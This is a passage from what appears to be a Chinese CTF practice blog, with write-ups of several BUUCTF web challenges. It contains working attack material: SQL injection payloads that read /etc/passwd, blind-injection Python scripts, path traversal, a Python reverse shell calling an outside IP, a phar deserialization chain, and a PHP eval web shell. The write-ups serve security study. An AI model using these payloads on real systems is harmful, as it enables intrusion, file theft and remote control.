src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329003323533.png" alt="image-20220329003323533"></p><p>当我们访问一个页面，取出这个页面中category的值然后接受content的值，插入到该页面。但是问题就出在，此代码只对用户输入的值做了转义，而绝对信任从服务器中取出的值，这就导致了二次注入。所以我们要想办法闭合sql语句，使其可以执行我们恶意的sql语句。</p><p>所以我们要对发帖处的categories做特殊输入</p><pre><code>0&#39;,content = database(), /*</code></pre><p>然后在留言处输入</p><pre><code>*/#</code></pre><p>这时候的sql语句就变为</p><pre><code>$sql = &quot;insert into comment        set category = &#39;0&#39;,content = &#39;database()&#39;/*&#39;,        content = &#39;*/#&#39;,        bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>简化后</p><pre><code>$sql = &quot;insert into comment set category = &#39;0&#39;,content = &#39;database()&#39;,bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>这样通过在category构造，可以把content替换成我们想要的语句</p><p>我们来看一下执行效果</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005247027.png" alt="image-20220329005247027"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005310132.png" alt="image-20220329005310132"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005321316.png" alt="image-20220329005321316"></p><p>成功爆出了数据库</p><p>查看一下权限</p><pre><code>0&#39;,content = user(), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005602357.png" alt="image-20220329005602357"></p><p>最高权限，可以尝试load_file()读取文件</p><pre><code>0&#39;,content = load_file(&#39;/etc/passwd&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005942676.png" alt="image-20220329005942676"></p><p>我们发现www用户(一般和网站操作相关的用户，由中间件创建)在/home/www目录,读取这下面的.bash_history文件</p><pre><code>每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。</code></pre><pre><code>0&#39;,content = load_file(&#39;/home/www/.bash_history&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010244317.png" alt="image-20220329010244317"></p><p>我们可以看到它解压了一个html.zip，删除html.zip,然后整个文件夹复制到/var/www/html里，然后删除.DS_Store</p><pre><code>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。通过.DS_Store可以知道这个目录里面所有文件的清单。</code></pre><p>它还有一份存在于在/tmp//html/目录中，构造sql语句进行读取</p><pre><code>0&#39;,content = load_file(&#39;/tmp/html/.DS_Store&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010811271.png" alt="image-20220329010811271"></p><p>这里文件太多，无法完全显示，进行十六进制转换</p><pre><code>0&#39;,content = hex(load_file(&#39;/tmp/html/.DS_Store&#39;)), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329011204300.png" alt="image-20220329011204300"></p><p>解码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013046184.png" alt="image-20220329013046184"></p><p>发现可疑文件</p><pre><code>flag_8946e1ff1ee3e40f.php</code></pre><p>构造sql语句进行读取</p><pre><code>0&#39;,content = load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;), /*</code></pre><p>这里有个坑，/tmp/html/flag_8946e1ff1ee3e40f.php的flag是假flag，还是要当当前运行的网站目录下读取</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013441800.png" alt="image-20220329013441800"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013451988.png" alt="image-20220329013451988"></p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>考察sql注入</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161851618.png" alt="image-20220329161851618"></p><p>测试一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161953080.png" alt="image-20220329161953080"></p><p>有waf，fuzz一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162032033.png" alt="image-20220329162032033"></p><p>发现很多关键词被过滤了</p><p>考虑盲注，测试一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162428599.png" alt="image-20220329162428599"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162354207.png" alt="image-20220329162354207"></p><p>确认了盲注的存在</p><pre><code>为什么加上||1=1后，值会变为Nu1L后呢，这里牵扯到运算顺序，这是我之前百思不得其解的一点，后门才想起来</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162630562.png" alt="image-20220329162630562"></p><p>我们可以看到比较运算的优先级是高于or的，所以会先判断右边的值是否为真，如果为真就不会再看左边了。</p><p>总之我们确定了要从盲注入手，但还有一个关键点，那就是information这个表被禁用，我们需要从其他表中获取我们需要的内容。</p><p><strong>1.利用mysql5.7新增的sys.schema_auto_increment_columns</strong></p><pre><code> 这是sys数据库下的一个视图，基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名以下为该视图的所有列</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141522482.png" alt="img"></p><p><strong>2.sys.schema_table_statistics_with_buffer</strong></p><pre><code> 这是sys数据库下的视图，里面存储着所有数据库所有表的统计信息  与它表结构相似的视图还有  sys.x$schema_table_statistics_with_buffer  sys.x$schema_table_statistics  sys.x$ps_schema_table_statistics_io以下为该视图的常用列（全部列有很多很多)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141702221.png" alt="img"></p><p><strong>3.mysql默认存储引擎innoDB携带的表</strong></p><pre><code>  mysql.innodb_table_stats  mysql.innodb_index_stats  两表均有database_name和table_name字段，可以利用</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141811114.png" alt="img"></p><p>盲注需要用二进制跑才能提高效率，贴上写的盲注脚本，我太菜了写一个要半天时间</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;i = 0result = &#39;&#39;for i in range(1,2000):    min = 32    max = 128    mid = (min + max) // 2    while min &lt; max:        payload = &quot;1^(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i, mid)        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        if &quot;Error&quot; in res.text:            min = mid + 1        else:            max = mid        mid = (min + max) // 2    result += chr(int(mid))    print(result)    time.sleep(0.5)</code></pre><p>最好的办法是背下来模板，这样真正的比赛时才能较快写题。</p><p>最终得到两个表</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329180202611.png" alt="image-20220329180202611"></p><p>接下来就要从表中拿flag</p><p>下面要用到<strong>无列名注入</strong></p><p>为什么要采用这个注入呢，是因为sys.schema_table_statistics_with_buffer中只有表的信息，并没有列的信息，因此无法使用常规的方法。</p><p>关于无列名注入，首先我们来看一个例子</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211549667.png" alt="image-20220329211549667"></p><p>这代表字符串的大小于长短无关，而与首字母(如果首字母相同则继续向下比大小)的ascii有关</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211742422.png" alt="image-20220329211742422"></p><p>由这个我们就能构造出payload</p><p>先来判断下字段</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213941106.png" alt="image-20220329213941106"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213956411.png" alt="image-20220329213956411"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329214035443.png" alt="image-20220329214035443"></p><p>由此可判断字段为两个</p><p>payload</p><pre><code>id=1||((select 1,&#123;0&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code></pre><p>代码:</p><p>暴力</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;value = &#39;&#39;def get_flag(char,value):    return value+charfor m in range(1,2000):    for i in range(32,128):        payload = &#39;2||((select 1,&quot;&#123;&#125;&quot;))&gt;(select * from f1ag_1s_h3r3_hhhhh)&#39;.format(get_flag(chr(i), value))        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        time.sleep(0.5)        if &quot;Nu1L&quot; in res.text:            value += chr(i-1)            print(value)            break</code></pre><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p><strong>非预期解</strong></p><p>这题做的很奇妙，，，直接非预期解了</p><pre><code>e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/page?url=../../../../flag</code></pre><p>得到一个图片，拖到010editor，flag直接出现</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330004918193.png" alt="image-20220330004918193"></p><p><strong>预期解</strong></p><p>还是学习下正规思路吧</p><p>首先应该读取下进程信息</p><pre><code>在/proc 文件系统中，每一个进程都有一个相应的文件  。下面是/proc 目录下的一些重要文件  ：/proc/pid/cmdline  包含了用于开始进程的命令  ；/proc/pid/cwd 包含了当前进程工作目录的一个链接  ；/proc/pid/environ  包含了可用进程环境变量的列表  ；/proc/pid/exe  包含了正在进程中运行的程序链接；/proc/pid/fd/  这个目录包含了进程打开的每一个文件的链接；/proc/pid/mem  包含了进程在内存中的内容；/proc/pid/stat 包含了进程的状态信息；/proc/pid/statm  包含了进程的内存使用信息。 </code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010223445.png" alt="image-20220330010223445"></p><p>可以看到刚开始执行了</p><pre><code>python2 app.py</code></pre><p>我们来读取下app.py的源码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010349857.png" alt="image-20220330010349857"></p><pre><code class="python">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#39;/&#39;)def index():    return render_template(&#39;search.html&#39;)@app.route(&#39;/page&#39;)def page():    url = request.args.get(&quot;url&quot;)    try:        if not url.lower().startswith(&quot;file&quot;):            res = urllib.urlopen(url)            value = res.read()            response = Response(value, mimetype=&#39;application/octet-stream&#39;)            response.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=beautiful.jpg&#39;            return response        else:            value = &quot;HACK ERROR!&quot;    except:        value = &quot;SOMETHING WRONG!&quot;    return render_template(&#39;search.html&#39;, res=value)@app.route(&#39;/no_one_know_the_manager&#39;)def manager():    key = request.args.get(&quot;key&quot;)    print(SECRET_KEY)    if key == SECRET_KEY:        shell = request.args.get(&quot;shell&quot;)        os.system(shell)        res = &quot;ok&quot;    else:        res = &quot;Wrong Key!&quot;    return resif __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;, port=8080)</code></pre><p>linux里如果没有关闭文件会放在内存里，就算你remove掉了<strong>在/proc/[pid]/fd下还是会保存</strong></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012552404.png" alt="image-20220330012552404"></p><p>找到了密钥</p><pre><code>8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=</code></pre><p>结果是无回显rce</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012910567.png" alt="image-20220330012910567"></p><p>使用反弹shell</p><pre><code>http://e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/no_one_know_the_manager?key=8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=&amp;shell=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22108.166.201.16%22,3333));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330014147414.png" alt="image-20220330014147414"></p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>这题很简单，进去后我们只有50元但是有一个100元的曲奇</p><p>猜测购买这个曲奇获得flag</p><p>点击购买并抓包</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164344642.png" alt="image-20220330164344642"></p><p>seesion很像base64加密</p><p>解密一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164431797.png" alt="image-20220330164431797"></p><p>修改下money然后再base64加密</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164507027.png" alt="image-20220330164507027"></p><p>购买100元的曲奇，替换原有的cookie</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164535408.png" alt="image-20220330164535408"></p><p>成功获得flag</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>点击查看文件</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=</code></pre><p>观察url，很可能是文件包含，读取下各个文件源码</p><p>index.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;base.php&#39;;?&gt; </code></pre><p>base.php</p><pre><code class="php">&lt;?php     session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt;     &lt;meta charset=&quot;utf-8&quot;&gt;     &lt;title&gt;web3&lt;/title&gt;     &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt;     &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;     &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt;     &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt;         &lt;div class=&quot;container-fluid&quot;&gt;         &lt;div class=&quot;navbar-header&quot;&gt;             &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt;         &lt;/div&gt;             &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt;                 &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt;                 &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;             &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt;                 &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;         &lt;/div&gt;     &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt;</code></pre><p>file.php</p><pre><code class="php">首页    查看文件    上传文件    10.244.80.46&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt;  </code></pre><p>upload_file.php</p><pre><code class="php">222.90.67.205&lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = &quot;center&quot;&gt;         &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt;     p&#123; margin:0 auto&#125; &lt;/style&gt; &lt;div&gt; &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;     &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt;     &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;     &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;</code></pre><p>function.php</p><pre><code class="php">222.90.67.205&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt; </code></pre><p>我们是无法利用文件读取来读取flag的。class.php一看就是反序列化，但是所有的代码里面都没有unserialize方法。有文件上传点，且phar协议没有过滤，那么就应该考察的是利用phar协议来进行反序列化逃逸，那我们就要尝试来构造poc链。</p><p>首先确定终点，它应该是可以读取文件的一个方法，我们锁定file_get方法</p><pre><code>$text = base64_encode(file_get_contents($value));</code></pre><p>我们就可以向这个方法中传入我们需要读取的文件路径就可以了。</p><p>思路:</p><pre><code>对象销毁，调用__destruct()方法，最后会echo一个值，令$C1e4r-&gt;str=$Show,这样就会调用show对象的__toString()方法，再令$Show-&gt;str[&#39;str&#39;]=$Test,test对象中并没有source，所以会调用get方法，令Test-&gt;params[source] = &quot;/var/www/html/f1ag.php&quot;,就可以成功读取flag</code></pre><p>poc链</p><pre><code class="php">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;&#125;class Test&#123;    public $file;    public $params;&#125;$c1e4r = new C1e4r();$show = new Show();$test = new Test();$c1e4r-&gt;str = $show;$show-&gt;str[&#39;str&#39;]=$test;$test-&gt;params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;;$phar = new Phar(&quot;sakura.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c1e4r);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;</code></pre><p>在本地搭建php环境，然后访问，会生成一个phar文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214617285.png" alt="image-20220330214617285"></p><p>接下来要把这个文件上传到目标服务器，但是只允许图片进行上传</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214739536.png" alt="image-20220330214739536"></p><p>所以我们把后缀改为.gif，这并不会影响phar文件的解析</p><p>接下来要得到我们上传文件的路径</p><pre><code>$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </code></pre><p>对文件名和远程地址进行md5加密，后缀加上jpg，由此得到文件名</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220208000.png" alt="image-20220330220208000"></p><pre><code>0b0c73463194f72e78079b81d921c8f4.jpg路径为:xxx/upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220359594.png" alt="image-20220330220359594"></p><p>payload</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=phar://upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220521789.png" alt="image-20220330220521789"></p><p>解密一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220555486.png" alt="image-20220330220555486"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>简单文件上传，进去后注册账号，登录。</p><p>可以直接上传PHP文件</p><p>ma.php</p><pre><code>GIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;x&#39;]);&lt;/script&gt;</code></pre><p>然后复制图片链接，到蚁剑中连接</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141935935.png" alt="image-20220331141935935"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141947473.png" alt="image-20220331141947473"></p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331142206699.png" alt="image-20220331142206699"></p><p>查看源代码</p><pre><code class="php"> &lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword = [    // no path traversal    &#39;\.\.&#39;,    // no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    // no data exfiltration    &#39;flag&#39;  ];  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body = file_get_contents(&#39;php://input&#39;); #body获取post数据,后面会对这进行$json = json_decode($body, true); #对获取得数据进行解码if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123; 